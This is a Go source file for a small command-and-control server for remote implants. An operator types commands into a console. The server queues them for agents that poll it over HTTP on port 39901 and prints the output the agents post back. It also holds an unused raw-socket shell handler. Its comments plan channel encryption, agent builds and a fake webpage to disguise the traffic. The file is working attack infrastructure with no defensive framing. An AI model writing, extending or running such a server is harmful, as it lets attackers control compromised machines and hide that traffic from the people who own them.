package main

// Commands, implant, channel, modules
// TODO: channel encryption, agent build, multiple agent-side handling(url path or encyption), fake webpage regex command

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
)

const addr string = ":39901"

var cmds = make([]string, 0)

// error handling
func handleError(err error) (b bool) {
	if err != nil {
		fmt.Println(err)
		return true
	}
	return false
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	go io.Copy(os.Stdout, bufio.NewReader(conn))
	io.Copy(bufio.NewWriter(conn), os.Stdin)
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	var message string
	var buff bytes.Buffer
	switch r.Method {
	case "GET":
		if len(cmds) > 0 {
			message = cmds[0]
			cmds = cmds[1:]
		} else {
			message = "***NIL***"
		}
		w.Write([]byte(message))
		return
	case "POST":
		buff.ReadFrom(r.Body)
		fmt.Printf("\nFrom %v:\n", r.Host)
		fmt.Println(buff.String())
		fmt.Print("=> ")
		return
	default:
		message = "Bad method"
		w.Write([]byte(message))
		return

	}

}

func conListenAndServe(addr string, handler http.Handler) {
	if err := http.ListenAndServe(addr, nil); err != nil {
		// panic aborts easily
		// channel <- err
		panic(err)
	}
}

func main() {
	http.HandleFunc("/", httpHandler)
	go conListenAndServe(addr, nil)

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("=> ")
		str, _ := reader.ReadString('\n')
		cmds = append(cmds, str)
	}

}
